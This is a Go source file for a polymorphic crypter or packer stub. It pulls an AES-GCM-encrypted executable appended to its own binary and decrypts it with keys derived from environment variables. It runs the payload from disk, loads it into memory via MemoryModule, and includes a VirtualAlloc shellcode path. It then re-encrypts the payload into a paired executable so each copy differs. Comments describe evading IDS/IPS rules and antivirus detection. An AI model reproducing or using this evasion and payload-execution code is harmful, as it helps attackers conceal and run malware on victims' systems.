package main
/*
#cgo CFLAGS: -IMemoryModule
//#cgo LDFLAGS: MemoryModule/MemoryModule.o
#cgo LDFLAGS: MemoryModule/buildx64/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
//#include "loadl.h"

*/
import "C"
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
	"log"
	"io/ioutil"
	"bytes"
 	"unsafe"
	"path/filepath"
	"syscall"
	"io"
	"crypto/sha512"
	"strings"
	rand2 "math/rand"
	"time"
	"os/exec"
)
//User can edit this separator string to avoid detection by it (IDS/IPS rule for example).
// Anything can be set as long as it isn't too short or common inside a binary file
// IMPORTANT! For this program to work both programs MUST have SAME spearator string value
var separatorString = []byte("-------***------")

func encrypt(key []byte, nonce []byte, plaintext []byte) ([]byte, []byte){
	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)

	if err != nil {
		panic(err.Error())
	}

	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
	return ciphertext, nonce
}
func decrypt(nonce []byte, ciphertext []byte) []byte {
	purePayload := getPureExecutable()
	var plaintext []byte
	for _, item := range os.Environ() {
		splits := strings.Split(item, "=")
		keySplit := splits[0]
		value := os.Getenv(keySplit)

		key := deriveKey(value, purePayload)

		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err.Error())
		}

		aesgcm, err := cipher.NewGCM(block)

		if err != nil {
			panic(err.Error())
		}
		plaintext, err = aesgcm.Open(nil, nonce, ciphertext, nil)
		//If there was no error it means the key was correct and decryption is done
		if err == nil{
			return plaintext
		}

	}
	fmt.Printf("Executable failed to decrypt %s",plaintext)
	return plaintext

}

func generateRandomKey() (key []byte) {
	purePayload := getPureExecutable()

	envVariables := os.Environ()
	numberOfEnvVars := len(envVariables)
	rand2.Seed(time.Now().Unix())
	envPair := envVariables[rand2.Intn(numberOfEnvVars)]
	splits := strings.Split(envPair, "=")
	keySplit :=splits[0]
	environmentalVar := os.Getenv(keySplit)

	sha_env := sha512.New()
	sha_env.Write([]byte(environmentalVar))
	shaHashEnvironemntalVar := sha_env.Sum(nil)

	sha_pay := sha512.New()
	sha_pay.Write(purePayload)
	shaHashPayload := sha_pay.Sum(nil)

	combined := append(shaHashEnvironemntalVar,shaHashPayload ...)

	sha_comb := sha512.New()
	sha_comb.Write(combined)
	shaHashCombined := sha_comb.Sum(nil)

	key = shaHashCombined[:32]
	return key
}
func generateNonce() (nonce []byte){
	nonce = []byte("123456789101")

	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	return nonce
}

func deriveKey(environmentalVar string, purePayload []byte)(key []byte){
	sha_env := sha512.New()
	sha_env.Write([]byte(environmentalVar))

	shaHashEnvironemntalVar := sha_env.Sum(nil)

	sha_pay := sha512.New()
	sha_pay.Write(purePayload)
	shaHashPayload := sha_pay.Sum(nil)

	combined := append(shaHashEnvironemntalVar,shaHashPayload ...)

	sha_comb := sha512.New()
	sha_comb.Write(combined)
	shaHashCombined := sha_comb.Sum(nil)

	key = shaHashCombined[:32]

	return key
}
//TODO - Remove detectOldKey() and replace with deriveKey + decrypt
func getIV()(initialisationVector []byte){
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}
	exPath := ex
	b, _ := ioutil.ReadFile(exPath)

	position := bytes.Index(b, separatorString)
	slicedExe := b[position+len(separatorString):]

	secondPosition :=bytes.Index(slicedExe, separatorString)
	slicedPayload := slicedExe[secondPosition+len(separatorString):]

	initialisationVector = slicedPayload[:12]
	return initialisationVector
}
//This method gets the pure packer exe, without any payload.
func getPureExecutable() []byte{
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}

	exPath := ex
	b, _ := ioutil.ReadFile(exPath)

	//First we have to find first separatorstring appearance in binary file - not the one we want
	// it's there because it's a staticly declared variable
	// The second one is appended by us and That is what we're looking for.
	//After that we cut off the payload and get clean executable
	position := bytes.Index(b, separatorString)
	slicedExe := b[position+len(separatorString):]
	secondPosition :=bytes.Index(slicedExe, separatorString)
	lengthOfCut := position + secondPosition + len(separatorString)
	pureExeBytes := b[:lengthOfCut]
	return pureExeBytes
}


//Finds and Extracts appended encrypted payload. It takes no input parameters as it checks the exe for it's own appended content
func loadPayloadFromExecutable() []byte{
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}

	exPath := ex
	b, _ := ioutil.ReadFile(exPath)

	position := bytes.Index(b, separatorString)
	slicedExe := b[position+len(separatorString):]

	secondPosition :=bytes.Index(slicedExe, separatorString)
	slicedPayload := slicedExe[secondPosition+len(separatorString)+12:]

	//Create an empty exe without old payload
	fileName := getPairedFileName()
	lengthOfCut := position + secondPosition + len(separatorString)
	rewriteFile(fileName, b[:lengthOfCut])
	return slicedPayload
}
func loadExecutableIntoMemory(executable []byte) {
//First option - customized
	handle := C.MemoryLoadLibraryEx(unsafe.Pointer(&executable[0]),
		(C.size_t)(len(executable)),
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(nil),                 // void *userdata (we're not passing any data to the dll or exe)
	)
	if handle == nil {
		fmt.Println("MemoryLoadLibrary failed")
		os.Exit(1)
	}

//Second option - Simpler function call, less customization
/*	handle := C.MemoryLoadLibrary(unsafe.Pointer(&executable[0]),(C.size_t)(len(executable)))
	if handle == nil {
		fmt.Println("MemoryLoadLibrary failed")
		os.Exit(1)
	}
*/
	// Execute binary
	output := C.MemoryCallEntryPoint(handle)
	fmt.Printf("Output handle: %s\n%s\n",output,handle)
	// Cleanup
	C.MemoryFreeLibrary(handle)

//Third option - using loadl.h (at the moment the "best" non working solution)
/*
	fmt.Println("Loading DLL")
	sc_c:=C.CString("E:\\payload.exe")
	C.LoadFromMemory(sc_c)*/
}
func shellCodeExecute(executable []byte){
	const (
		memCommit = 0x1000
		memReserve = 0x2000
		pageExecRW = 0x40
	)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc := kernel32.NewProc("VirtualAlloc")

	fmt.Println("len full_payload", len(executable))
	addr, _, err := procVirtualAlloc.Call(0, uintptr(len(executable)), memReserve|memCommit, pageExecRW)

	if addr == 0 {
		fmt.Println(err)
		os.Exit(1)
	}
	buff := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range executable {
		buff[x] = value
	}
	fmt.Println(len(buff))
	syscall.Syscall(addr, 0, 0, 0, 0)
}
func loadFromDisk(outputFileName string, decryptedExecutable []byte){
	ioutil.WriteFile(outputFileName,decryptedExecutable, 0644)
	cmd := exec.Command(outputFileName)
	cmd.Run()
}

func getPairedFileName() string{
	executablePath, err := os.Executable()
	var pairedFileName string
	if err != nil {
		log.Fatalf("Failed getting this program's name! - details: %s", err)
	}
	folderPath := filepath.Dir(executablePath)
	currentFileName := filepath.Base(executablePath)

	secondFileName := "polymorphicTwo.exe"
	firstFileName := "polymorphicOne.exe"

	if currentFileName != secondFileName {
		pairedFileName = secondFileName
	}else{
		pairedFileName = firstFileName
	}

	completePath := folderPath+"\\"+pairedFileName
	return completePath
}
func rewriteFile(filename string, message []byte){
	err := ioutil.WriteFile(filename, message, 0644)
	if err != nil{
		fmt.Println(err)
	}
}
func appendFile( filename string, message []byte, nonce []byte) {
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}
	defer file.Close()

	_, err = file.Write(separatorString)
	if err != nil {
		log.Fatalf("failed writing separator to file: %s", err)
	}
	_, err = file.Write(nonce)
	if err != nil {
		log.Fatalf("failed writing nonce to file: %s", err)
	}
	_, err = file.Write(message)
	if err != nil {
		log.Fatalf("failed writing message to file: %s", err)
	}
}


func main(){
	//User should change this into anything, as long as it has .exe at the end
	outputFileName := "testExecutable.exe"
	iv := getIV()
	//fmt.Printf("IV: %s\n", iv)

	encryptedPayloadFromFile := loadPayloadFromExecutable();
	decryptedExecutable := decrypt(iv, encryptedPayloadFromFile)

	//Unfortunately as I couldn't get MemoryModule to work properly, at the moment I was forced to use this "dummy"
	//This creates a file on disk and then executes it. This would be really bad because AV should be able to detect it
	//in very short time
	loadFromDisk(outputFileName, decryptedExecutable)
	loadExecutableIntoMemory(decryptedExecutable)


	nonce := generateNonce()
	otherFilePairName := getPairedFileName()

	encryptedExecutable, _ := encrypt(generateRandomKey(), nonce, decryptedExecutable)
	appendFile(otherFilePairName, encryptedExecutable, nonce)

	//fmt.Printf("nonce: %s", nonce)

}
